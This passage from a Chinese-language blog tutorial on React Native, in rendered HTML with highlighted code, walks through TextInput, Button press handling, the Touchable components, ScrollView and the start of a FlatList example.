class=\"keyword\">return</span> (</span><br><span class=\"line\">    &lt;View style=&#123;&#123;<span class=\"attr\">padding</span>: <span class=\"number\">10</span>&#125;&#125;&gt;</span><br><span class=\"line\">      &lt;TextInput</span><br><span class=\"line\">        style=&#123;&#123;<span class=\"attr\">height</span>: <span class=\"number\">40</span>, <span class=\"attr\">backgroundColor</span>: <span class=\"string\">'#ccc'</span>&#125;&#125;</span><br><span class=\"line\">        placeholder=<span class=\"string\">\"Type here to translate!\"</span></span><br><span class=\"line\">        onChangeText=&#123;text =&gt; setText(text)&#125;</span><br><span class=\"line\">        defaultValue=&#123;text&#125;</span><br><span class=\"line\">      /&gt;</span><br><span class=\"line\">      &lt;Text style=&#123;&#123;<span class=\"attr\">padding</span>: <span class=\"number\">10</span>, <span class=\"attr\">fontSize</span>: <span class=\"number\">42</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &#123;text.split(<span class=\"string\">' '</span>).map(<span class=\"function\">(<span class=\"params\">word</span>) =&gt;</span> word &amp;&amp; <span class=\"string\">'🍕'</span>).join(<span class=\"string\">' '</span>)&#125;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;/</span>View&gt;</span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327083821128.png\" alt=\"image-20200327083821128\" style=\"zoom:50%;\"></p>\n<h2 id=\"处理触摸事件\"><a href=\"#处理触摸事件\" class=\"headerlink\" title=\"处理触摸事件\"></a>处理触摸事件</h2><h3 id=\"onPress-事件\"><a href=\"#onPress-事件\" class=\"headerlink\" title=\"onPress 事件\"></a>onPress 事件</h3><figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;Button</span><br><span class=\"line\">  onPress=&#123;() =&gt; &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">\"你点击了按钮！\"</span>);</span><br><span class=\"line\">  &#125;&#125;</span><br><span class=\"line\">  title=<span class=\"string\">\"点我！\"</span></span><br><span class=\"line\">/&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327084507790.png\" alt=\"image-20200327084507790\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  _onPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You tapped the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">        flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      buttonContainer: &#123;</span><br><span class=\"line\">        margin: <span class=\"number\">20</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      alternativeLayoutButtonContainer: &#123;</span><br><span class=\"line\">        margin: <span class=\"number\">20</span>,</span><br><span class=\"line\">        flexDirection: <span class=\"string\">'row'</span>,</span><br><span class=\"line\">        justifyContent: <span class=\"string\">'space-between'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span><br><span class=\"line\">          &lt;Button</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            title=<span class=\"string\">\"Press Me\"</span></span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;View style=&#123;styles.buttonContainer&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            title=\"Press Me\"</span></span><br><span class=\"line\"><span class=\"regexp\">            color=\"#841584\"</span></span><br><span class=\"line\"><span class=\"regexp\">          /</span>&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;View style=&#123;styles.alternativeLayoutButtonContainer&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Button</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            title=\"This looks great!\"</span></span><br><span class=\"line\"><span class=\"regexp\">          /</span>&gt;</span><br><span class=\"line\">          &lt;Button</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            title=<span class=\"string\">\"OK!\"</span></span><br><span class=\"line\">            color=<span class=\"string\">\"#841584\"</span></span><br><span class=\"line\">          /&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/view/posts/e61ae078/image-20200327085101363.png\" alt=\"image-20200327085101363\" style=\"zoom:50%;\"></p>\n<h3 id=\"Touchable-系列组件\"><a href=\"#Touchable-系列组件\" class=\"headerlink\" title=\"Touchable 系列组件\"></a>Touchable 系列组件</h3><ul>\n<li>一般来说，你可以使用<a href=\"https://reactnative.cn/docs/touchablehighlight\" target=\"_blank\" rel=\"noopener\"><strong>TouchableHighlight</strong></a>来制作按钮或者链接。注意此组件的背景会在用户手指按下时变暗。</li>\n<li>在 Android 上还可以使用<a href=\"https://reactnative.cn/docs/touchablenativefeedback\" target=\"_blank\" rel=\"noopener\"><strong>TouchableNativeFeedback</strong></a>，它会在用户手指按下时形成类似墨水涟漪的视觉效果。</li>\n<li><a href=\"https://reactnative.cn/docs/touchableopacity\" target=\"_blank\" rel=\"noopener\"><strong>TouchableOpacity</strong></a>会在用户手指按下时降低按钮的透明度，而不会改变背景的颜色。</li>\n<li>如果你想在处理点击事件的同时不显示任何视觉反馈，则需要使用<a href=\"https://reactnative.cn/docs/touchablewithoutfeedback\" target=\"_blank\" rel=\"noopener\"><strong>TouchableWithoutFeedback</strong></a>。</li>\n</ul>\n<ul>\n<li>检测用户是否进行了长按，组件中使用<code>onLongPress</code>属性来实现。</li>\n</ul>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Alert, Platform, StyleSheet, Text, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback, View &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  _onPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You tapped the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  _onLongPressButton() &#123;</span><br><span class=\"line\">    Alert.alert(<span class=\"string\">'You long-pressed the button!'</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">        paddingTop: <span class=\"number\">60</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'center'</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      button: &#123;</span><br><span class=\"line\">        marginBottom: <span class=\"number\">30</span>,</span><br><span class=\"line\">        width: <span class=\"number\">260</span>,</span><br><span class=\"line\">        alignItems: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        backgroundColor: <span class=\"string\">'#2196F3'</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      buttonText: &#123;</span><br><span class=\"line\">        textAlign: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">        padding: <span class=\"number\">20</span>,</span><br><span class=\"line\">        fontSize: <span class=\"number\">16</span>,</span><br><span class=\"line\">        color: <span class=\"string\">'#fff'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* 组件的背景会在用户手指按下时变暗。 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableHighlight onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125; underlayColor=<span class=\"string\">\"white\"</span>&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableHighlight&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableHighlight&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &#123;/</span>* 用户手指按下时降低按钮的透明度，而不会改变背景的颜色。 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;TouchableOpacity onPress=&#123;this._onPressButton&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableOpacity&lt;/</span>Text&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>TouchableOpacity&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* Android 用户手指按下时形成类似墨水涟漪的视觉效果。 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableNativeFeedback</span><br><span class=\"line\">            onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125;</span><br><span class=\"line\">            background=&#123;Platform.OS === <span class=\"string\">'android'</span> ? TouchableNativeFeedback.SelectableBackground() : <span class=\"string\">''</span>&#125;&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableNativeFeedback&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableNativeFeedback&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &#123;/</span>* 不显示任何视觉反馈 *<span class=\"regexp\">/&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;TouchableWithoutFeedback</span></span><br><span class=\"line\"><span class=\"regexp\">            onPress=&#123;this._onPressButton&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">            &gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;View style=&#123;styles.button&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;TouchableWithoutFeedback&lt;/</span>Text&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;/</span>TouchableWithoutFeedback&gt;</span><br><span class=\"line\">        &#123;<span class=\"comment\">/* 绑定单击 和 长按事件 */</span>&#125;</span><br><span class=\"line\">        &lt;TouchableHighlight onPress=&#123;<span class=\"keyword\">this</span>._onPressButton&#125; onLongPress=&#123;<span class=\"keyword\">this</span>._onLongPressButton&#125; underlayColor=<span class=\"string\">\"white\"</span>&gt;</span><br><span class=\"line\">          &lt;View style=&#123;styles.button&#125;&gt;</span><br><span class=\"line\">            &lt;Text style=&#123;styles.buttonText&#125;&gt;Touchable <span class=\"keyword\">with</span> Long Press&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;/</span>View&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/TouchableHighlight&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"滚动视图\"><a href=\"#滚动视图\" class=\"headerlink\" title=\"滚动视图\"></a>滚动视图</h2><p><a href=\"https://reactnative.cn/docs/scrollview\" target=\"_blank\" rel=\"noopener\"><code>ScrollView</code></a>是一个通用的可滚动的容器，你可以在其中放入多个组件和视图，而且这些组件并不需要是同类型的。ScrollView 不仅可以垂直滚动，还能水平滚动（通过<code>horizontal</code>属性来设置）。</p>\n<p>下面的示例代码创建了一个垂直滚动的<code>ScrollView</code>，其中还混杂了图片和文字组件。</p>\n<p><img src=\"/view/posts/e61ae078/ScrollView.gif\" alt=\"ScrollView\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;ScrollView style=&#123;&#123;<span class=\"attr\">backgroundColor</span>: <span class=\"string\">'#df02d0'</span>&#125;&#125;&gt;</span><br><span class=\"line\">        &lt;Text style=&#123;&#123;<span class=\"attr\">fontSize</span>:<span class=\"number\">48</span>&#125;&#125;&gt;Scroll me plz&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Image source=&#123;require('./</span><span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;If you like&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Scrolling down&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;What'</span>s the best&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;Image source=&#123;require('./</span><span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:48&#125;&#125;&gt;Framework around?&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Image source=&#123;require('</span>./<span class=\"number\">1.</span>png<span class=\"string\">')&#125; style=&#123;&#123;width: 100, height: 100, borderColor: '</span>gray<span class=\"string\">',  borderWidth: 1&#125;&#125; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;Text style=&#123;&#123;fontSize:80&#125;&#125;&gt;React Native&lt;/Text&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/ScrollView&gt;</span></span><br><span class=\"line\"><span class=\"string\">  );</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><code>ScrollView</code>适合用来显示数量不多的滚动元素。放置在<code>ScrollView</code>中的所有组件都会被渲染，哪怕有些组件因为内容太长被挤出了屏幕外。</p>\n<h2 id=\"长列表\"><a href=\"#长列表\" class=\"headerlink\" title=\"长列表\"></a>长列表</h2><p><code>FlatList</code>组件用于显示一个==垂直的滚动列表==，其中的元素之间结构近似而仅数据不同。</p>\n<p><code>FlatList</code>更适于==长列表数据，且元素个数可以增删。==和<a href=\"https://reactnative.cn/docs/using-a-scrollview\" target=\"_blank\" rel=\"noopener\"><code>ScrollView</code></a>不同的是，<code>FlatList</code>并==不立即渲染所有元素，而是优先渲染屏幕上可见的元素。==</p>\n<p><code>FlatList</code>组件必须的两个属性是<code>data</code>和<code>renderItem</code>。<code>data</code>是列表的数据源，而<code>renderItem</code>则从数据源中逐个解析数据，然后返回一个设定好格式的组件来渲染。</p>\n<p><img src=\"/view/posts/e61ae078/FlatList.gif\" alt=\"FlatList\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">      container: &#123;</span><br><span class=\"line\">       flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">       paddingTop: <span class=\"number\">22</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      item: &#123;</span><br><span class=\"line\">        padding: <span class=\"number\">10</span>,</span><br><span class=\"line\">        fontSize: <span class=\"number\">18</span>,</span><br><span class=\"line\">        height: <span class=\"number\">44</span>,</span><br><span class=\"line\">        borderBottomColor: <span class=\"string\">'#f0f'</span>,</span><br><span class=\"line\">        borderBottomWidth: <span class=\"number\">1</span></span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">    